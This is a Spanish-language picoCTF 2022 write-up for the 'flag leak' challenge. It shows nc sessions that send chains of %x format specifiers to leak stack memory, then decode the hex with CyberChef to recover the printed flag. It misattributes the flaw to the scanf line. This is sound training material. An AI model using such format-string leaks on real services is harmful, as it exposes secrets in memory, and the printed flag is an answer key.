# flag leak - 2022




## Descripción
Story telling class 1/2
Additional details will be available after launching your challenge instance.

## Solución

- El código tienes lo siguiente:  `scanf("%127s", story)`tiene una vulnerabilidad de cadena de formato, donde la memoria se puede filtrar con `%x`:
``` bash
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ ls    
vuln  vuln.c
                                                                                                                                                           
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ ls -la
total 28
drwxr-xr-x 2 kali kali  4096 may 17 23:00 .
drwxr-xr-x 4 kali kali  4096 may 17 23:00 ..
-rw-r--r-- 1 kali kali 15876 may 17 23:00 vuln
-rw-r--r-- 1 kali kali   947 may 17 23:00 vuln.c
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ nc saturn.picoctf.net 52647
Tell me a story and then I'll tell you one >> %x%x%x%x%x%x%x%x%X%x
Here's a story - 
ffd42ac0ffd42ae080493467825782578257825782578257825782578255825FFFFFF000
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ nc saturn.picoctf.net 52647
Tell me a story and then I'll tell you one >> %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Here's a story - 
ffb242b0ffb242d08049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578252578256f6369707b4654436b34334c5f676e3167346c466666305f3474535f665f6b63633130667d653833fbad200033905d000f7f03990804c00080494100804c000ffb2439880494182ffb24444ffb244500ffb243b000f7cf9ed5
                                                                        ┌──(kali㉿kali)-[~/Descargas/BE]
└─$ nc saturn.picoctf.net 52647
Tell me a story and then I'll tell you one >> %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%
Here's a story - 
ff894d60ff894d808049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578252578256f6369707b4654436b34334c5f676e3167346c466666305f3474535f665f6b63633130667d653833fbad200016f9ae000f7f2b990804c00080494100804c000ff894e4880494182ff894ef4ff894f000ff894e6000f7d21ed5
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ 

``` 


- Con ayuda de [CyberChef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&input=NmY2MzY5NzA3YjQ2NTQ0MzZiMzQzMzRjNWY2NzZlMzE2NzM0NmM0NjY2NjYzMDVmMzQ3NDUzNWY2NjVmNmI2MzYzMzEzMDY2N2Q2NTM4MzNmYmFkMjAwMDMzOTA1ZDAwMGY3ZjAzOTkwODA0YzAwMDgwNDk0MTAwODA0YzAwMGZmYjI0Mzk4ODA0OTQxODJmZmIyNDQ0NGZmYjI0NDUwMGZmYjI0M2IwMDBmN2NmOWVkNQoK) encontramos la bandera conviertieno de ascii a hexa:
![[Pasted image 20230518001431.png]]

## Bandera 
picoCTF{L34k1ng_Fl4g_0ff_St4ck_ff01c38e}

## Referencias
- [CyberChef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&input=NmY2MzY5NzA3YjQ2NTQ0MzZiMzQzMzRjNWY2NzZlMzE2NzM0NmM0NjY2NjYzMDVmMzQ3NDUzNWY2NjVmNmI2MzYzMzEzMDY2N2Q2NTM4MzNmYmFkMjAwMDMzOTA1ZDAwMGY3ZjAzOTkwODA0YzAwMDgwNDk0MTAwODA0YzAwMGZmYjI0Mzk4ODA0OTQxODJmZmIyNDQ0NGZmYjI0NDUwMGZmYjI0M2IwMDBmN2NmOWVkNQoK)
